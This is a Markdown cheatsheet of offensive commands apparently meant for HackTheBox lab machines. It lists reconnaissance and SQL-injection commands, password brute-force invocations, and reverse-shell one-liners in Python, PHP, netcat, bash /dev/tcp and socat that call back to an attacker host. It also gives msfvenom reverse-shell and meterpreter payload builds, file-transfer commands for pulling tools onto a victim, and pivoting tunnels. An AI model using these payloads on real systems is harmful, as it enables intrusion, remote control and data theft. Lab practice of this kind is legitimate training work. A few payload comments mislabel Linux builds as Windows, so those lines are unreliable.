# **HackTheBox Cheatsheet**
<p align="center">
  <img src="images/htb.png"/>
</p>

HackTheBox Cheatsheet from any sources. Feel free to contribute.
## Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [AutoRecon](#autorecon)
  - [dig](#dig)
  - [DNSRecon](#dnsrecon)
  - [ffuf](#ffuf)
  - [dirb](#dirb)
  - [Gobuster](#gobuster)
  - [dirsearch](#dirsearch)
  - [sqlmap](#sqlmap)
  - [WPScan](#wpscan)
  - [Nikto](#nikto)
  - [Metasploit (Auxiliary)](#metasploit-auxiliary)
  - [Enum4Linux](#enum4linux)
  - [LinPEAS](#linpeas)
  - [WinPEAS](#winpeas)
  - [pspy](#pspy)
- [Brute Force (Cracking)](#brute-force-cracking)
  - [JohnTheRipper](#johntheripper)
  - [hashcat](#hashcat)
  - [Hydra](#hydra)
  - [Patator](#patator)
- [Reverse Shell](#reverse-shell)
  - [revshell.com](https://www.revshell.com/)
  - [Python](#reverse-shell-python)
  - [PHP](#reverse-shell-php)
  - [netcat](#reverse-shell-netcat)
  - [bash](#reverse-shell-bash)
  - [socat](#reverse-shell-socat)
  - [Metasploit (Payload)](#metasploit-payload)
  - [ysoserial.net (Windows)](https://github.com/pwntester/ysoserial.net)
- [File Transfer](#file-transfer)
  - [wget](#wget)
  - [curl](#curl)
  - [netcat](#netcat)
  - [openssl](#openssl)
  - [PowerShell](#powershell)
  - [certutil](#certutil)
- [Port Forwarding](#port-forwarding)
  - [ssh](#ssh)
  - [chisel](#chisel)
  - [shootback](#shootback)
  - [gost](#gost)
## Contents
### Enumeration
#### Nmap
Nmap ("Network Mapper") is a free and open source utility for network discovery and security auditing.\
Source: https://nmap.org/
```
nmap -sV -sC -o result.nmap <IP>
```
#### AutoRecon
AutoRecon is a multi-threaded network reconnaissance tool which performs automated enumeration of services.\
Source: https://github.com/Tib3rius/AutoRecon
```
autorecon <IP> -o <output> # Save output to file
```
#### dig
dig is a flexible tool for interrogating DNS name servers.\
Source: https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
```
# Zone Transfer
dig axfr @<IP>
dig axfr @<IP> <DOMAIN>
# More Info
dig ANY @<IP> <DOMAIN>     # Any information
dig A @<IP> <DOMAIN>       # Regular DNS request
dig AAAA @<IP> <DOMAIN>    # IPv6 DNS request
dig TXT @<IP> <DOMAIN>     # Information
dig MX @<IP> <DOMAIN>      # Emails related
dig NS @<IP> <DOMAIN>      # DNS that resolves that name
dig -x 192.168.0.2 @<IP>   # Reverse lookup
dig -x 2a00:1450:400c:c06::93 @<IP> # Reverse IPv6 lookup
```
#### DNSRecon
DNSRecon is a Python script that provides the ability to perform: Check all NS Records for Zone Transfers. Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT).\
Source: https://github.com/darkoperator/dnsrecon
```
dnsrecon -d <DOMAIN> -a -n <IP>                       # Zone Transfer
dnsrecon -D <WORDLIST> -d <DOMAIN> -n <IP>  # Brute-force subdomains
```
#### ffuf
A fast web fuzzer written in Go.\
Source: https://github.com/ffuf/ffuf
```
ffuf -w <WORDLIST> -u http://<IP/DOMAIN>/FUZZ                      # Directory discovery
ffuf -w <WORDLIST> -u http://<IP/DOMAIN>/ -H 'Host: FUZZ' -fs 4242 # Vhost discovery (-fs is default vhost response size)
ffuf -w <WORDLIST> -u http://<IP/DOMAIN>/index.php?FUZZ=1 -fs 4242 # GET parameter discovery
```
#### dirb
DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the responses.\
Source: http://dirb.sourceforge.net/
```
dirb http://<IP/DOMAIN>/ <WORDLIST>
```
#### Gobuster
Gobuster is a tool used to brute-force URIs including directories and files as well as DNS subdomains.\
Source: https://github.com/OJ/gobuster
```
gobuster dir -u https://<IP/DOMAIN> -w <WORDLIST>  # dir mode
gobuster dns -d <DOMAIN> -w <WORDLIST>             # dns mode
gobuster vhost -u http://<DOMAIN> -w <WORDLIST>    # vhost mode
```
#### dirsearch
An advanced command-line tool designed to brute force directories and files in webservers.\
Source: https://github.com/maurosoria/dirsearch
```
./dirsearch.py -u http://<IP/DOMAIN>                              # default
./dirsearch.py -e php,html,js -u http://<IP/DOMAIN>               # custom extension
./dirsearch.py -e php,html,js -u http://<IP/DOMAIN> -w <WORDLIST> # custom wordlist & extension
```
#### sqlmap
sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.\
Source: https://sqlmap.org/
```
sqlmap -u <URL> --dbs                                              # get a list of databases
sqlmap -u <URL> -D <DATABASE> --tables                             # get a list of tables on database
sqlmap -u <URL> -D <DATABASE> -T <TABLE> --columns                 # get a list of columns on table
sqlmap -u <URL> -D <DATABASE> -T <TABLE> -C <column,column> --dump # get contents of specified columns
```
```
sqlmap -u <URL> --os-shell                                        # get shell to run command on target
sqlmap -u <URL> --file=<FILE>                                     # read file on target
sqlmap -u <URL> --file-write=<LOCALFILE> --file-dest=<REMOTEPATH> # write file on target
sqlmap -u <URL> --sql-query=<SQLQUERY>                            # execute sql query
```
#### WPScan
WPScan scans remote WordPress installations to find security issues.\
Source: https://github.com/wpscanteam/wpscan
```
wpscan --url http://<IP/DOMAIN>/ # default scan (more info: wpscan -h/-hh)
```
#### Nikto
Nikto is a pluggable web server and CGI scanner written in Perl, using rfp’s LibWhisker to perform fast security or informational checks.\
Source: https://github.com/sullo/nikto
```
nikto -host http://<IP/DOMAIN>/
```
#### Metasploit Auxiliary
The Metasploit Framework includes hundreds of auxiliary modules that perform scanning, fuzzing, sniffing, and much more. Although these modules will not give you a shell, they are extremely valuable when conducting a penetration test.\
Source: https://www.offensive-security.com/metasploit-unleashed/auxiliary-module-reference/
```
# Example Usage
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > show options
Module options:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target address range or CIDR identifier
   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf auxiliary(smb_version) > set RHOSTS <IP/IPs>
RHOSTS => <IP/IPs>
msf auxiliary(smb_version) > run
```
#### Enum4Linux
A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts.\
Source: https://github.com/CiscoCXSecurity/enum4linux
```
enum4linux <IP/DOMAIN>
```
#### LinPEAS
LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.\
Source: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
```
remote:~$ ./linpeas.sh
```
#### WinPEAS
Check the Local Windows Privilege Escalation.\
Source: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
```
C:\Windows\Temp> .\winpeas.exe
```
#### pspy
pspy is a command line tool designed to snoop on processes without need for root permissions.\
Source: https://github.com/DominicBreuker/pspy
```
remote:~$ ./pspy64
```
### Brute Force (Cracking)
#### JohnTheRipper
John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems.\
Source: https://www.openwall.com/john/
```
john --wordlist=<WORDLIST> <FILE>                       # default
john --format=<HASHFORMAT> --wordlist=<WORDLIST> <FILE> # define hash type
john --show <FILE>                                      # show cracked hash
```
#### hashcat
Hashcat supports five unique modes of attack for over 300 highly-optimized hashing algorithms. hashcat currently supports CPUs, GPUs, and other hardware accelerators on Linux, and has facilities to help enable distributed password cracking.\
Source: https://hashcat.net/hashcat/
```
hashcat <FILE> <WORDLIST>
```
#### Hydra
Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.\
Source: https://github.com/vanhauser-thc/thc-hydra
```
hydra -L <USERLIST> -P <PASSLIST> ssh://<IP/DOMAIN> # brute-force ssh
hydra -l <USER> -P <PASSLIST> ssh://<IP/DOMAIN>     # brute-force ssh known username
# more information hydra -h
```
#### Patator
Patator is a multi-purpose brute-forcer, with a modular design and a flexible usage.\
Source: https://github.com/lanjelot/patator
```
patator ftp_login user=<USER> password=FILE0 0=<WORDLIST> host=<IP/DOMAIN> -x ignore:mesg='Login incorrect.'          # brute-force ftp
patator mysql_login user=<USER> password=FILE0 0=<WORDLIST> host=<IP/DOMAIN> -x ignore:fgrep='Access denied for user' # brute-force mysql
```
### Reverse Shell
#### Reverse Shell (Python)
```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```python
import socket,subprocess,os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP", PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p=subprocess.call(["/bin/sh","-i"]) # you can change to /bin/bash
```
#### Reverse Shell (PHP)
Full Code: https://github.com/pentestmonkey/php-reverse-shell
```sh
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```
#### Reverse Shell (netcat)
```sh
nc -e /bin/sh <IP> <PORT> # if option -e available
```
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f # if option -e not available
```
#### Reverse Shell (bash)
```sh
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 # tcp mode
bash -i >& /dev/udp/<IP>/<PORT> 0>&1 # udp mode
```
#### Reverse Shell (socat)
Attacker:
```sh
socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
```
Victim:
```sh
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>
```
#### Metasploit (Payload)
Source: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ \
Non-Meterpreter:
```sh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe # staged windows x86
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe # staged windows x64

msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe # stageless windows x86
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe # stageless windows x64

msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf # staged linux x86
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf # staged linux x64

msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf # stageless windows x86
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf # stageless windows x64
```
Meterpreter:
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe # staged windows x86
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe # staged windows x64

msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe # stageless windows x86
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe # stageless windows x64

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf # staged linux x86
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf # staged linux x64

msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf # stageless linux x86
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf # stageless linux x64
```
### File Transfer
#### wget
GNU Wget is a free utility for non-interactive download of files from the Web. It supports HTTP, HTTPS, and FTP protocols, as well as retrieval through HTTP proxies.\
Source: https://www.gnu.org/software/wget/
```sh
wget http://[IP]/file
wget --no-check-certificate http://[IP]/file
```
#### curl
curl is a tool to transfer data from or to a server, using one of the supported protocols (DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP).\
Source: https://curl.se/
```sh
curl http://[IP]/file           # print output to stdout
curl http://[IP]/file -o [FILE] # save output to file
```
#### netcat
Netcat usually used for reverse shell, but you can also use it for transfer files.
```sh
receiver:~$ nc -nvlp [PORT] > filename
sender:~$ cat file | nc -w 2 [IP_RECEIVER] [PORT]
```
#### openssl
Openssl can be used for transfer file.\
Source: https://www.openssl.org/
More info: https://gtfobins.github.io/gtfobins/openssl/ \
Receiver:
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port [PORT] > filename
```
Sender:
```
openssl s_client -quiet -connect <RECEIVER_IP>:<PORT> < "<FILE>"
```
#### PowerShell
Source: https://docs.microsoft.com/en-us/powershell/ \
WebClient:
```
(New-Object System.Net.WebClient).DownloadFile("<URL>", "<PATHTOFILE>")
```
Invoke-WebRequest
```
Invoke-WebRequest -Uri <URL> -OutFile <PATHTOFILE>
```
#### certutil
The purpose of the certutil was originally for certificate and CA management, but can also be used for file transfer.\
Source: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
```
certutil -urlcache -f http://192.168.1.2/putty.exe putty.exe
```
### Port Forwarding
#### ssh
SSH tunneling, or SSH port forwarding, is a method of transporting arbitrary data over an encrypted SSH connection. SSH tunnels allow connections made to a local port (that is, to a port on your own desktop) to be forwarded to a remote machine via a secure channel.\
Source: https://www.concordia.ca/ginacody/aits/support/faq/ssh-tunnel.html
```
ssh -L <LPORT>:<RHOST>:<RPORT> <USER>@<IP>
```
#### chisel
Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang).\
Source: https://github.com/jpillora/chisel
```
local:~$ ./chisel server -p 4444 --reverse
machine:~$ ./chisel client <LHOST>:4444 R:<LPORT>:<RHOST>:<RPORT>
```
You can access machine <RHOST>:<RPORT> from <LHOST>:<LPORT>.
#### shootback
shootback is a reverse TCP tunnel let you access target behind NAT or firewall.\
Source: https://github.com/aploium/shootback
```
local:~$ python3 master.py -m <LHOST>:4444 -c 127.0.0.1:<LPORT>
machine:~$ python3 slaver.py -m <LHOST>:4444 -t <RHOST>:<RPORT>
```
#### gost
A simple security tunnel written in Golang.\
Source: https://github.com/ginuerzh/gost/blob/master/README_en.md
